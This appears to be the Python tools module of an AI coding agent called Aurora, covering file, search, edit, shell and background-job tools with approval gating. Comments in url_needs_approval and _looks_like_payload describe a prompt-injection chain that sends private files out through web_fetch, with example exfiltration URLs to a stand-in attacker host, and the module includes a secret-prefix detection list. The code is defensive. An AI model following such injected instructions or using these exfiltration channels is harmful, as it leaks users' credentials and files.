"""The tool set Aurora exposes to the model (R6). Each tool is a spec (name +
JSON-schema parameters, provider-agnostic) plus a `run(args) -> str`.
Writes/commands are gated by the caller (agent.py) via approve.py; the tools
themselves just do the work. Reads and web tools need no approval."""

import atexit
import re
import subprocess
import threading
import time
from pathlib import Path

from . import patch as patchmod
from .paths import write_text_preserving

MAX_READ_BYTES = 200_000

# which tools mutate / execute — the caller gates these
NEEDS_APPROVAL = {"write_file", "edit_file", "run_command", "apply_patch",
                 "wait_until", "cancel_command"}


def needs_approval(name: str, args: dict | None = None) -> bool:
    """R119: every `mcp_*` tool call needs approval, unconditionally — MCP
    has no universal "this tool is safe" flag, and Aurora's whole safety
    model is approval-gated writes. A prefix check rather than adding each
    discovered tool to NEEDS_APPROVAL individually, since the tool list is
    only known once a server's `tools/list` handshake completes, at
    Engine-construction time — this way the rule holds regardless of what
    any given server exposes."""
    if name in NEEDS_APPROVAL or name.startswith("mcp_"):
        return True
    # R283: web_fetch is ungated for an ordinary public page, but NOT when
    # the URL could reach a private service or carry data out. Only decided
    # when the caller passes `args` — the mutation checkpoint asks by name
    # alone, and a fetch mutates nothing.
    if name == "web_fetch" and args is not None:
        return url_needs_approval(str(args.get("url", "")))
    return False


def _private_host(host: str, resolve: bool = True) -> bool:
    """Loopback/private/link-local/reserved literal, a local-only name
    (localhost, *.local, *.ts.net, *.internal), or a name that RESOLVES to
    any of those — the SSRF targets (a LAN admin UI, 169.254.169.254).

    R300: `resolve=False` for the pre-approval check. Resolving a name is a
    DNS query, and a DNS query for `<data>.attacker.example` IS the
    exfiltration — it used to happen before the user was ever asked. The
    fetch re-checks the address it actually connects to."""
    import ipaddress
    import socket
    host = (host or "").strip("[]").lower()
    if not host:
        return True
    if host == "localhost" or host.endswith((".local", ".ts.net", ".internal",
                                             ".localhost", ".lan", ".home")):
        return True
    try:
        addrs = [ipaddress.ip_address(host)]
    except ValueError:
        if not resolve:
            return False
        try:
            addrs = [ipaddress.ip_address(ai[4][0].split("%")[0])
                     for ai in socket.getaddrinfo(host, None)]
        except (OSError, ValueError):
            return False      # unresolvable: the fetch itself will just fail
    return any(not a.is_global for a in addrs)


def url_needs_approval(url: str) -> bool:
    """R283: web_fetch + read_file were both ungated, so injected text in a
    fetched page could chain read_file(<private file>) → web_fetch(
    'https://attacker/?d=<contents>') with no prompt at all, or read an
    internal service. A fetch now asks first when it targets a non-public
    host or carries a query string (the easy exfil channel). A plain public
    page — the overwhelmingly common case — still needs no approval."""
    from urllib.parse import urlsplit
    try:
        u = urlsplit(url.strip())
    except ValueError:
        return True
    if u.scheme not in ("http", "https"):
        return True
    return (bool(u.query) or _private_host(u.hostname or "", resolve=False)
            or _looks_like_payload(u))


# R300: the query string is not the only channel. Data in the PATH
# (`https://attacker/AKIAIOSFODNN7EXAMPLE`) or a SUBDOMAIN
# (`https://<base32>.attacker/`) went out with no prompt. A URL whose path
# segment or host label looks like encoded data, that names a well-known
# secret prefix, or that is simply very long, now asks first. Heuristic by
# nature: a short secret in an ordinary-looking path can still pass — the
# prompt is the backstop for the common shapes, not a guarantee.
_SECRET_PREFIXES = ("AKIA", "ASIA", "ghp_", "gho_", "github_pat_", "sk-", "xox",
                    "glpat-", "AIza", "-----BEGIN")
_DATA_SEG = re.compile(r"^[A-Za-z0-9+/=_%.-]{40,}$")


def _looks_like_payload(u) -> bool:
    from urllib.parse import unquote
    if len(u.geturl()) > 200:
        return True
    host = (u.hostname or "")
    if any(len(label) >= 30 for label in host.split(".")):
        return True
    path = unquote(u.path or "")
    for seg in path.split("/"):
        if _DATA_SEG.match(seg) and not re.fullmatch(r"[0-9a-f]{40}|[0-9a-f]{64}", seg):
            return True   # a 40/64-hex commit or content hash is ordinary
        if any(p.lower() in seg.lower() for p in _SECRET_PREFIXES if len(seg) >= 12):
            return True
    return False

# R94: tools the agent loop may run CONCURRENTLY within one round. An
# explicit allowlist, deliberately NOT "everything outside NEEDS_APPROVAL":
# the test is "read-only AND has no shared state" — a tool that rewrites
# shared state fails that even when ungated. Everything here only reads the
# filesystem or the network, so ordering between them is unobservable — the
# model asked for all of them at once anyway.
PARALLEL_SAFE = {"read_file", "list_dir", "grep", "find_files",
                 "web_search", "web_fetch"}

# R94: run a round's PARALLEL_SAFE calls concurrently. runtime.parallel_tools
# turns it off.
PARALLEL_ENABLED = True
MAX_PARALLEL = 8


def set_parallel_tools(on: bool) -> None:
    global PARALLEL_ENABLED
    PARALLEL_ENABLED = bool(on)


def _resolve(path: str) -> Path:
    return Path(path).expanduser()


def read_file(path: str, offset: int = 0, limit: int = 0, **_) -> str:
    """Read a text file, optionally a LINE RANGE (R90b): `offset` is the
    1-based first line, `limit` the number of lines. Without a range the old
    behaviour is unchanged — the head of the file up to MAX_READ_BYTES.

    The range exists because the truncation notice tells the model to "read
    a specific range" after a big file; before this there was no way for it
    to actually do that, so it could only re-read the same head forever."""
    p = _resolve(path)
    if not p.is_file():
        return f"[error: no such file: {path}]"
    try:
        offset, limit = int(offset or 0), int(limit or 0)
    except (TypeError, ValueError):
        return "[error: offset/limit must be integers]"
    if offset or limit:
        start = max(offset, 1)
        out, n, total, more, size = [], 0, 0, False, 0
        with p.open("r", encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f, 1):   # stream: never slurp the file
                total = i
                if i < start:
                    continue
                if limit and n >= limit:
                    more = True   # stopped early: the real total is unknown
                    break
                # R95f: stop at the byte cap too. `offset` with no `limit`
                # otherwise accumulated every remaining line in memory before
                # truncating at the end — on a multi-GB file that is the
                # slurp this streaming loop exists to avoid.
                if size >= MAX_READ_BYTES:
                    more = True
                    break
                out.append(line)
                size += len(line)
                n += 1
        if not out:
            return f"[no lines: file has fewer than {start} lines]"
        end = start + n - 1
        text = "".join(out)
        if len(text) > MAX_READ_BYTES:
            text = text[:MAX_READ_BYTES] + \
                f"\n[truncated at {MAX_READ_BYTES} bytes]"
        where = f"[lines {start}-{end}, more follow]" if more \
            else f"[lines {start}-{end} of {total}]"
        return where + "\n" + text
    with p.open("rb") as f:  # never slurp a huge file just to keep the head
        data = f.read(MAX_READ_BYTES + 1)
    text = data[:MAX_READ_BYTES].decode("utf-8", errors="replace")
    if len(data) > MAX_READ_BYTES:
        text += (f"\n[truncated at {MAX_READ_BYTES} bytes — re-read with "
                 f"offset/limit for a specific line range]")
    return text


def list_dir(path: str = ".", **_) -> str:
    p = _resolve(path)
    if not p.is_dir():
        return (f"[error: not a directory: {path} — cwd is {Path.cwd()}; "
                f"use an absolute path or ~/…]")
    out = []
    for c in sorted(p.iterdir()):
        out.append(f"{'d' if c.is_dir() else '-'} {c.name}")
    return "\n".join(out) or "[empty]"


GREP_PRUNE = [".git", "node_modules", ".venv", "venv", "__pycache__",
              ".build", "build", "dist", ".mypy_cache", ".pytest_cache"]

# Cap on how many paths find_files returns — a broad pattern over a big tree
# (`*` from the repo root) could otherwise walk on forever; the model can
# always narrow the pattern/path and re-run.
MAX_FIND_RESULTS = 500


# R292: find_files had no time bound at all (grep has GREP_TIMEOUT) — measured
# 19.7s walking 812k entries under ~, and unbounded on a bigger tree or a
# network mount, on the worker thread.
FIND_TIMEOUT = 30


def find_files(pattern: str, path: str = ".", _cancel=None, **_) -> str:
    """Search for files by glob pattern (e.g. '*.py', 'test_*.py'),
    recursively — the filename-search counterpart to `grep`'s content
    search (feature request, 2026-07-27). Uses `os.walk` with the same
    prune list as `grep` (GREP_PRUNE), pruning DURING the walk so an
    excluded directory (node_modules, .venv, …) is never even descended
    into — unlike `Path.rglob`, which has no way to skip a subtree mid-walk
    and would still pay the cost of listing everything inside one.

    Matches against both the bare filename (so a simple `*.py` matches at
    any depth) and the path relative to `path` (so a pattern with a `/` in
    it, e.g. `tests/test_*.py`, also works)."""
    import fnmatch as _fnmatch
    import os
    root = _resolve(path)
    if not root.is_dir():
        return (f"[error: not a directory: {path} — cwd is {Path.cwd()}; "
                f"use an absolute path or ~/…]")
    import time as _time
    out: list[str] = []
    truncated = False
    stopped = ""
    deadline = _time.monotonic() + FIND_TIMEOUT
    for dirpath, dirnames, filenames in os.walk(root):
        # R292: once per directory — cheap next to the listing itself
        if _time.monotonic() > deadline:
            stopped = f"timed out after {FIND_TIMEOUT}s"
            break
        if _cancel is not None and _cancel():
            stopped = "cancelled by user"
            break
        dirnames[:] = [d for d in dirnames if d not in GREP_PRUNE]
        for name in filenames:
            rel = (Path(dirpath) / name).relative_to(root).as_posix()
            if _fnmatch.fnmatch(name, pattern) or _fnmatch.fnmatch(rel, pattern):
                out.append(rel)
                if len(out) >= MAX_FIND_RESULTS:
                    truncated = True
                    break
        if truncated:
            break
    if stopped:
        note = (f"[search {stopped} — results are PARTIAL; narrow the "
                f"path/pattern]")
        return ("\n".join(sorted(out)) + "\n" + note) if out else note
    if not out:
        return "[no matches]"
    text = "\n".join(sorted(out))
    if truncated:
        text += (f"\n[truncated at {MAX_FIND_RESULTS} results — "
                 f"narrow the pattern/path]")
    return text


GREP_TIMEOUT = 30


def grep(pattern: str, path: str = ".", **_) -> str:
    try:
        excludes = [f"--exclude-dir={d}" for d in GREP_PRUNE]
        # -E (extended regex), NOT the default BRE: models write ERE by
        # habit — `(foo|bar)`, `a+`, `x?`. Under BRE those metacharacters are
        # literals, so the search SILENTLY returns "[no matches]" instead of
        # erroring, and the model concludes the code doesn't exist (R90b).
        # R127: BINARY pipes, decoded once at the end. Text mode wraps the
        # pipe in a TextIOWrapper whose `.read(n)` blocks until n chars have
        # arrived — see the read loop below for why that broke the timeout.
        proc = subprocess.Popen(
            ["grep", "-rnIE", *excludes, "--", pattern, str(_resolve(path))],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # R96m: read stdout INCREMENTALLY and stop once we have enough,
        # instead of subprocess.run(capture_output=True) — that buffers
        # grep's COMPLETE stdout before the old `out[:MAX_READ_BYTES]`
        # truncation ever ran, so a broad pattern over a large tree
        # (`grep -rn "e" ~`) could exhaust memory within the timeout, and
        # the model is exactly the actor most likely to issue an
        # over-broad pattern. Bound the PRODUCER, not the consumer:
        # `select` waits for readability with the REMAINING timeout budget
        # each iteration, so a stall between chunks (not just total runtime)
        # is still caught, and the process is killed the moment enough
        # output has arrived, instead of after it finishes producing more
        # that would only be thrown away.
        import os as _os
        import select
        import time
        chunks: list[bytes] = []
        total = 0
        truncated = False
        timed_out = False
        # Review pass: stderr is ALSO piped, and was never drained here —
        # only `select`ed for on stdout. `-rnI` over a tree with unreadable
        # dirs/files produces a "Permission denied" line per miss, and grep
        # can print enough of them to fill stderr's pipe buffer (64KB):
        # once full, grep blocks trying to WRITE to it, produces no more
        # stdout either, `select` (watching only stdout) never fires, and a
        # search that would have finished in milliseconds burns the entire
        # GREP_TIMEOUT and reports a false timeout. Drained the same way as
        # stdout — `os.read` whatever's ready — but capped (STDERR_CAP)
        # since only the first line ever gets shown (below); reads past the
        # cap are still performed (draining, not accumulated) so the pipe
        # never fills.
        STDERR_CAP = 4096
        stderr_chunks: list[bytes] = []
        stderr_len = 0
        watch = [proc.stdout, proc.stderr]
        try:
            deadline = time.monotonic() + GREP_TIMEOUT
            while True:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    timed_out = True
                    break
                ready, _, _ = select.select(watch, [], [], remaining)
                if not ready:
                    continue
                if proc.stderr in ready:
                    chunk = _os.read(proc.stderr.fileno(), 65536)
                    if not chunk:
                        watch.remove(proc.stderr)   # EOF — stop selecting on it
                    elif stderr_len < STDERR_CAP:
                        stderr_chunks.append(chunk)
                        stderr_len += len(chunk)
                if proc.stdout not in ready:
                    continue
                # R127: a raw `os.read` on the fd, NOT `proc.stdout.read(n)`.
                # The latter is a buffered read that blocks until n bytes
                # arrive or the process exits, so it could block FAR past the
                # deadline `select` had just been given: the loop only bounded
                # the wait BETWEEN reads, never a stall inside one. That is
                # the normal shape for this tool — grep prints a few early
                # matches, then scans a large tree for minutes — so the 30s
                # timeout simply did not hold, on the worker thread.
                # `os.read` returns whatever is available right now (>=1 byte,
                # since select just said readable), so the loop always gets
                # back to re-check the deadline.
                chunk = _os.read(proc.stdout.fileno(), 65536)
                if not chunk:
                    break   # EOF — grep finished on its own
                chunks.append(chunk)
                total += len(chunk)
                if total >= MAX_READ_BYTES:
                    truncated = True
                    break
        finally:
            # ANY exit from the loop above (normal, truncated, timed out, or
            # an unexpected exception) must still reap the child — a bare
            # `except Exception` around the whole function would otherwise
            # leave it running/zombied, the exact failure mode R95c's
            # process-group kill exists to prevent for run_command.
            if timed_out or truncated:
                proc.kill()
            # Review pass: no blocking read here anymore — a bounded
            # `proc.stderr.read(4096)` in this `finally` could itself hang
            # with no deadline if grep were still alive holding stderr open
            # (e.g. killed above but not yet reaped). Everything worth
            # showing was already drained incrementally in the loop.
            stderr = b"".join(stderr_chunks).decode("utf-8", errors="replace")
            proc.stdout.close()
            proc.stderr.close()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)
        if timed_out:
            return f"[grep error: timeout after {GREP_TIMEOUT}s]"
        out = b"".join(chunks).decode("utf-8", errors="replace").strip()
        if out:
            if truncated:
                out = (out[:MAX_READ_BYTES]
                       + f"\n[output truncated at {MAX_READ_BYTES} chars — "
                         f"narrow the pattern/path]")
            return out
        # R95b: grep's exit codes are 0=matched, 1=no match, ≥2=ERROR. Only 1
        # means "[no matches]". Reporting an error as "no matches" is the
        # R90b failure mode again: an invalid regex made the model conclude
        # the code didn't exist instead of fixing its pattern.
        if proc.returncode >= 2:
            err = stderr.strip().splitlines()
            detail = err[0] if err else f"exit {proc.returncode}"
            return f"[grep error: {detail}]"
        return "[no matches]"
    except Exception as e:
        return f"[grep error: {e}]"


def _read_for_edit(p: Path) -> tuple[str, bool]:
    """R269: the file's text for an in-place edit, and whether it is
    uniformly CRLF. `read_text` translates every CRLF to LF and the write
    then emitted LF, so ONE edit rewrote a Windows-style file's every line
    ending. A uniformly-CRLF file is edited in LF form (so a model's
    LF-joined `old`/hunks still match) and converted back by
    `_restore_newlines`; anything else is read and written byte-faithfully."""
    with p.open("r", encoding="utf-8", newline="") as f:
        raw = f.read()
    crlf = "\r\n" in raw and raw.count("\n") == raw.count("\r\n")
    return (raw.replace("\r\n", "\n") if crlf else raw), crlf


def _restore_newlines(text: str, crlf: bool) -> str:
    return text.replace("\n", "\r\n") if crlf else text


def write_file(path: str, content: str, **_) -> str:
    # R241: atomic + mode/symlink preserving. `Path.write_text` truncates
    # first, so a crash, ENOSPC or a kill mid-write leaves the user's file
    # truncated or empty.
    p = _resolve(path)
    write_text_preserving(p, content)
    return f"[wrote {len(content)} bytes to {path}]"


def edit_file(path: str, old: str, new: str, replace_all: bool = False,
              **_) -> str:
    """Replace `old` with `new`. Unique-anchor by default; `replace_all`
    (R90g) opts into every occurrence, so renaming a symbol that appears 20×
    is one call instead of 20 uniquely-anchored ones."""
    p = _resolve(path)
    if not p.is_file():
        return f"[error: no such file: {path}]"
    # R270: an empty `old` "occurs" len(text)+1 times — with replace_all it
    # inserted `new` between every character of the file.
    if not old:
        return "[error: `old` must not be empty — use write_file to create or " \
               "replace a whole file]"
    text, crlf = _read_for_edit(p)                              # R269
    n = text.count(old)
    if n == 0:
        return "[error: `old` text not found — it must match exactly]"
    if n > 1 and not replace_all:
        return (f"[error: `old` text appears {n} times — make it unique, "
                f"or pass replace_all=true to change all {n}]")
    write_text_preserving(p, _restore_newlines(text.replace(old, new),
                                               crlf))   # R241, R269
    return f"[edited {path}]" if n == 1 else f"[edited {path} — {n} occurrences]"


def apply_patch(path: str, diff: str, **_) -> str:
    """Apply a unified diff (R97) — one atomic multi-hunk change instead of
    N sequential edit_file calls, each needing its own unique anchor. Hunks
    are matched by CONTENT (context + removed lines), never by the diff's
    own line numbers — see patch.py. All hunks apply, or none do and the
    file is left untouched."""
    p = _resolve(path)
    if not p.is_file():
        return f"[error: no such file: {path}]"
    try:
        hunks = patchmod.parse(diff)
    except patchmod.PatchError as e:
        return f"[error: {e}]"
    text, crlf = _read_for_edit(p)                              # R269
    try:
        new_text = patchmod.apply(text, hunks)
    except patchmod.PatchError as e:
        return f"[error: {e}]"
    if new_text == text:
        return "[no changes — patch was a no-op]"
    write_text_preserving(p, _restore_newlines(new_text, crlf))   # R241, R269
    return f"[applied {len(hunks)} hunk(s) to {path}]"


# default only: run_command's timeout is runtime.timeout when the engine has
# passed one down (set_command_timeout), so a slow build isn't cut off at a
# constant the user can't reach (R90g)
COMMAND_TIMEOUT = 300


def set_command_timeout(seconds: float) -> None:
    global COMMAND_TIMEOUT
    COMMAND_TIMEOUT = max(1, int(seconds))


# R194: how much of a command's output is held in memory. `communicate()` had
# no bound at all, so `run_command("yes")` grew until COMMAND_TIMEOUT (300s by
# default) — the same unbounded-producer shape R96m fixed for grep, and the
# model is again the actor most likely to issue the runaway command.
#
# 5MB rather than grep's 200k because this is ALSO the TUI's bash-mode path,
# where the user typed the command themselves and the output is theirs to
# read; the tool path truncates to TOOL_OUTPUT_LIMIT (60k) downstream anyway,
# so this cap is invisible there and generous here. Approximate, not exact:
# the chunk that crosses the cap is kept whole.
COMMAND_OUTPUT_CAP = 5 * 1024 * 1024


# R272: how often a running command polls the turn's cancel callback — the
# same cadence `cancellable_sse` uses for a streaming request.
_CANCEL_POLL_S = 0.15


class CommandCancelled(Exception):
    """Internal: `_run_command_once` saw its cancel callback go true."""


def _run_command_once(command: str, workdir: str | None,
                      timeout: float | None = None,
                      cancel=None) -> tuple[str, int | None]:
    """Run one shell command to completion (or `timeout`, default
    COMMAND_TIMEOUT), process-group-safe (R95c). Returns (raw combined
    stdout+stderr, returncode) — returncode is None on a timeout.

    Shared by `run_command` (the tool, which formats this into its
    "[exit N]"/"[timeout ...]" display text), `wait_until` (R100, which
    passes a shrinking per-attempt `timeout` so one hung attempt can't
    outrun the caller's own deadline — see R125b), and the TUI's bash mode
    (which needs the REAL exit code to decide whether to keep polling —
    parsing that back out of run_command's own display text would be
    fragile and is exactly the kind of thing that silently breaks the
    moment the text format changes)."""
    if timeout is None:
        timeout = COMMAND_TIMEOUT
    # R95c: own the whole process GROUP. `subprocess.run(shell=True,
    # timeout=…)` kills only the shell — every child it spawned survives,
    # reparented to init, and keeps running for the rest of the session (a
    # timed-out build, dev server or test run burns CPU forever). A new
    # session makes the shell a group leader so the timeout can kill the
    # whole tree.
    import os
    import select
    import time as _time
    # R144a: `errors="replace"`, same as read_file/grep already use — a command
    # emitting ANY non-UTF-8 byte (a latin-1 log, a binary blob) must not lose
    # the whole output, including the part that decoded fine.
    # R194: BINARY pipes, decoded once at the end, exactly as R127 did for
    # grep. Text mode wraps each pipe in a TextIOWrapper, and a buffered read
    # on that blocks until its buffer fills — which would defeat the deadline
    # the read loop below exists to enforce.
    # R271: stdin=DEVNULL. Inherited, it was the TUI's own terminal (raw mode,
    # owned by prompt_toolkit): a command that reads stdin — a REPL, a y/N
    # prompt, `git commit` without -m — fought the TUI for keystrokes or
    # blocked until COMMAND_TIMEOUT. EOF is the honest answer: nobody can type.
    proc = subprocess.Popen(command, shell=True, cwd=workdir,
                            stdin=subprocess.DEVNULL,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            start_new_session=True)
    # Read the group id NOW, while the shell is certainly alive. Looking it
    # up at timeout time is too late in the case that matters most: a command
    # that backgrounds something and exits (`(build &)`) leaves a grandchild
    # holding the stdout pipe, so communicate() blocks the full timeout even
    # though the shell is long gone — and os.getpgid() then raises
    # ProcessLookupError, losing the handle on the orphan we came to kill.
    try:
        pgid = os.getpgid(proc.pid)
    except OSError:
        pgid = None
    # R194: drain both pipes incrementally instead of `communicate()`, which
    # buffers the command's COMPLETE output in memory before any caller-side
    # truncation runs. Both pipes are watched together — draining only one is
    # the deadlock R153 documents (the child blocks writing to the pipe nobody
    # is reading, produces no more of the other, and the whole timeout burns
    # for nothing). Past the cap the reads still HAPPEN, they just stop being
    # accumulated: the point is to keep the pipe empty so the command runs to
    # completion normally. It is deliberately not killed for being verbose —
    # that would change its exit code and lose its side effects.
    out_chunks: list[bytes] = []
    err_chunks: list[bytes] = []
    out_len = err_len = 0
    truncated = False
    timed_out = False
    watch = [proc.stdout, proc.stderr]
    deadline = _time.monotonic() + timeout
    cancelled = False
    while watch:
        remaining = deadline - _time.monotonic()
        if remaining <= 0:
            timed_out = True
            break
        # R272: poll the turn's cancel between reads — Esc-Esc used to do
        # nothing until the command exited or hit COMMAND_TIMEOUT (300s).
        if cancel is not None and cancel():
            cancelled = True
            break
        wait = remaining if cancel is None else min(remaining, _CANCEL_POLL_S)
        ready, _, _ = select.select(watch, [], [], wait)
        for pipe in ready:
            # raw `os.read`, never a buffered `.read(n)` — see the Popen call
            chunk = os.read(pipe.fileno(), 65536)
            if not chunk:
                watch.remove(pipe)          # EOF on this pipe
                continue
            if pipe is proc.stdout:
                if out_len < COMMAND_OUTPUT_CAP:
                    out_chunks.append(chunk)
                    out_len += len(chunk)
                else:
                    truncated = True
            elif err_len < COMMAND_OUTPUT_CAP:
                err_chunks.append(chunk)
                err_len += len(chunk)
            else:
                truncated = True

    def _decoded() -> str:
        s = (b"".join(out_chunks).decode("utf-8", errors="replace")
             + b"".join(err_chunks).decode("utf-8", errors="replace"))
        if truncated:
            s += (f"\n[output truncated at {COMMAND_OUTPUT_CAP} bytes — "
                  "the command kept running; redirect to a file if you need "
                  "all of it]")
        return s

    if cancelled:
        _kill_group(proc, pgid)
        for pipe in (proc.stdout, proc.stderr):
            try:
                pipe.close()
            except OSError:
                pass
        try:
            proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            pass
        partial = _decoded().strip()
        raise CommandCancelled(partial)
    if not timed_out:
        # Both pipes are at EOF, which is not the same as "the process has
        # exited" — a double-forked grandchild can close them and leave the
        # shell alive. Bound the reap by whatever is left of the deadline so
        # that case can still time out rather than block the worker thread.
        try:
            proc.wait(timeout=max(0.0, deadline - _time.monotonic()))
        except subprocess.TimeoutExpired:
            timed_out = True
    for pipe in (proc.stdout, proc.stderr):
        try:
            pipe.close()
        except OSError:
            pass
    if not timed_out:
        return _decoded(), proc.returncode

    # Timed out: kill the group and report whatever was read before the
    # deadline — a partial build log is far more useful than a bare timeout
    # line.
    _kill_group(proc, pgid)
    partial = _decoded().strip()
    try:
        # R171: the direct child already got SIGKILL above, so reaping it is
        # normally instant — this wait only exists to avoid a zombie, not to
        # give an escaped grandchild time to die. A 5s bound blocked the
        # WORKER THREAD (no Esc polling happens here) up to 5s past the
        # command's own timeout on exactly the R170e escaped-grandchild case,
        # which the warning below already reports either way; shortening the
        # bound caps that extra stall without changing what gets reported.
        proc.wait(timeout=1)
    except subprocess.TimeoutExpired:
        # R170e: `_kill_group` only reaches processes still in `pgid` — a
        # grandchild that double-forked into its own session (`setsid`, a
        # daemonizing tool) escapes it, can keep holding the stdout pipe
        # open, and this final wait() can itself time out. That used to be
        # swallowed silently: the tool call "succeeded" with no sign anything
        # was left running. Surface it instead — the process itself still
        # can't be reached from here (that's the whole problem), but the
        # model/user should know to go looking.
        partial = (partial + "\n" if partial else "") + (
            "[warning: a grandchild process may have escaped cleanup "
            "and could still be running]")
    return partial, None


# R245: `run_command`/`wait_until` block the whole agent turn until the
# command exits — fine for a `pytest` run, useless for a multi-minute model
# download, where the very next thing the user does is ask "is it done yet?"
# and that question can't even reach the model until the blocking call
# returns. `background=True` launches the command detached (same
# process-group ownership as the foreground path, R95c, so it can still be
# killed as a whole tree) and returns a job id immediately; `check_command`
# polls it. Module-level, not per-Engine: a job outlives the tool call that
# started it, same lifetime class as the MCP servers in mcp.py.
_BG_LOCK = threading.Lock()
_BG_JOBS: dict[str, "_BackgroundJob"] = {}
_BG_NEXT_ID = 1
# a runaway model that keeps backgrounding jobs and never checks on them
# must not be able to fork-bomb the host — same reasoning as COMMAND_OUTPUT_CAP
# bounding a single command's memory instead of trusting the caller to stop.
MAX_BACKGROUND_JOBS = 4
# R293: finished jobs kept for check_command. Each holds up to
# COMMAND_OUTPUT_CAP × 2 (10MB) of output, and nothing ever removed one, so
# memory grew by up to 10MB per verbose job for the life of the process.
MAX_FINISHED_JOBS = 8


class _BackgroundJob:
    def __init__(self, job_id: str, command: str, proc, pgid):
        self.id = job_id
        self.command = command
        self.proc = proc
        self.pgid = pgid
        self.start = time.monotonic()
        self.lock = threading.Lock()          # guards everything below
        self.out_chunks: list[bytes] = []
        self.err_chunks: list[bytes] = []
        self.out_len = self.err_len = 0
        self.truncated = False
        self.done = False
        self.returncode: int | None = None


def _bg_drain(job: "_BackgroundJob") -> None:
    """Runs on its own thread for the job's whole lifetime, same
    incremental-drain shape as `_run_command_once`'s read loop but with no
    deadline — the job is meant to outlive this call. Marks the job done and
    records its exit code once both pipes hit EOF and the process reaps."""
    import os
    import select
    watch = [job.proc.stdout, job.proc.stderr]
    while watch:
        ready, _, _ = select.select(watch, [], [])
        for pipe in ready:
            chunk = os.read(pipe.fileno(), 65536)
            if not chunk:
                watch.remove(pipe)
                continue
            with job.lock:
                if pipe is job.proc.stdout:
                    if job.out_len < COMMAND_OUTPUT_CAP:
                        job.out_chunks.append(chunk)
                        job.out_len += len(chunk)
                    else:
                        job.truncated = True
                else:
                    if job.err_len < COMMAND_OUTPUT_CAP:
                        job.err_chunks.append(chunk)
                        job.err_len += len(chunk)
                    else:
                        job.truncated = True
    job.proc.wait()
    for pipe in (job.proc.stdout, job.proc.stderr):
        try:
            pipe.close()
        except OSError:
            pass
    with job.lock:
        job.done = True
        job.returncode = job.proc.returncode


def _bg_output(job: "_BackgroundJob") -> str:
    with job.lock:
        out = b"".join(job.out_chunks).decode("utf-8", errors="replace")
        err = b"".join(job.err_chunks).decode("utf-8", errors="replace")
        truncated = job.truncated
    s = out + err
    if truncated:
        s += (f"\n[output truncated at {COMMAND_OUTPUT_CAP} bytes — the "
              "job kept running; redirect to a file if you need all of it]")
    return s


def _prune_finished_jobs_locked() -> None:
    """R293: drop the oldest FINISHED jobs beyond MAX_FINISHED_JOBS. Caller
    holds _BG_LOCK. A running job is never dropped (it still owns a process
    group and a drain thread)."""
    finished = [jid for jid, j in _BG_JOBS.items() if j.done]
    for jid in finished[:max(0, len(finished) - MAX_FINISHED_JOBS)]:
        del _BG_JOBS[jid]


def _start_background(command: str, workdir: str | None) -> str:
    """Returns a job id, or an `[error: ...]` string at MAX_BACKGROUND_JOBS —
    same shape as the other tools' error returns, so the model sees it
    without a separate exception path."""
    import os
    global _BG_NEXT_ID
    with _BG_LOCK:
        _prune_finished_jobs_locked()                            # R293
        live = sum(1 for j in _BG_JOBS.values() if not j.done)
        if live >= MAX_BACKGROUND_JOBS:
            return (f"[error: {MAX_BACKGROUND_JOBS} background jobs already "
                    "running — check_command() one to completion, or let "
                    "one finish, before starting another]")
        job_id = f"bg{_BG_NEXT_ID}"
        _BG_NEXT_ID += 1
    proc = subprocess.Popen(command, shell=True, cwd=workdir,
                            stdin=subprocess.DEVNULL,           # R271
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            start_new_session=True)
    try:
        pgid = os.getpgid(proc.pid)
    except OSError:
        pgid = None
    job = _BackgroundJob(job_id, command, proc, pgid)
    with _BG_LOCK:
        _BG_JOBS[job_id] = job
    threading.Thread(target=_bg_drain, args=(job,), daemon=True).start()
    return job_id


def _kill_all_background_jobs() -> None:
    """atexit hook — a background download/build must not outlive the
    Aurora process that started it and silently keep running/holding
    resources with no one watching it, the same orphan concern R95c's
    process-group kill exists to prevent for run_command."""
    with _BG_LOCK:
        jobs = list(_BG_JOBS.values())
    for job in jobs:
        with job.lock:
            if job.done:
                continue
        _kill_group(job.proc, job.pgid)


atexit.register(_kill_all_background_jobs)


def check_command(job_id: str = "", tail: int = 4000, **_) -> str:
    """Poll a job started by `run_command(..., background=True)`. With no
    `job_id`, lists every known job (running or finished) so the model can
    ask "what's running?" without having kept the id — e.g. after a compact
    or a fresh turn that lost track of it. `tail` bounds how much of a
    long-running job's output comes back per poll, keeping only the END of
    it — the model is calling this repeatedly to watch progress, not to
    re-read the whole thing from the start every time."""
    with _BG_LOCK:
        jobs = dict(_BG_JOBS)
    if not job_id:
        if not jobs:
            return "[no background jobs]"
        lines = []
        for jid, job in sorted(jobs.items()):
            with job.lock:
                status = (f"exit {job.returncode}" if job.done
                          else f"running {time.monotonic() - job.start:.0f}s")
            lines.append(f"{jid}: {status} — {job.command}")
        return "\n".join(lines)
    job = jobs.get(job_id)
    if job is None:
        return f"[error: no such background job: {job_id}]"
    out = _bg_output(job)
    tail = max(200, int(tail or 4000))
    if len(out) > tail:
        out = f"[…{len(out) - tail} earlier bytes omitted…]\n" + out[-tail:]
    with job.lock:
        done, code = job.done, job.returncode
    status = f"[exit {code}]" if done else "[still running]"
    return f"{status}\n" + (out.strip() or "[no output yet]")


def cancel_command(job_id: str, **_) -> str:
    """Kill a job started by run_command(..., background=True) — R246. A
    background job is deliberately disconnected from Esc-Esc's
    `fe.cancel_event` (that event belongs to the current TURN, and the whole
    point of backgrounding is that the job outlives its turn — see R245), so
    there was no way to stop one short of it finishing or the whole process
    exiting (the `_kill_all_background_jobs` atexit hook). Same
    process-group kill as the foreground path (R95c/`_kill_group`) — reaches
    the job's real child processes, not just its shell. `_bg_drain`'s own
    thread observes the pipes closing and marks the job done/returncode
    itself; this only sends the signal."""
    with _BG_LOCK:
        job = _BG_JOBS.get(job_id)
    if job is None:
        return f"[error: no such background job: {job_id}]"
    with job.lock:
        if job.done:
            return f"[{job_id}] already finished (exit {job.returncode}) — nothing to cancel"
    _kill_group(job.proc, job.pgid)
    return f"[{job_id}] kill signal sent"


def _cancelled_text(e: "CommandCancelled") -> str:
    partial = str(e)
    return (partial + "\n" if partial else "") + \
        "[cancelled by user — the command's process group was killed]"


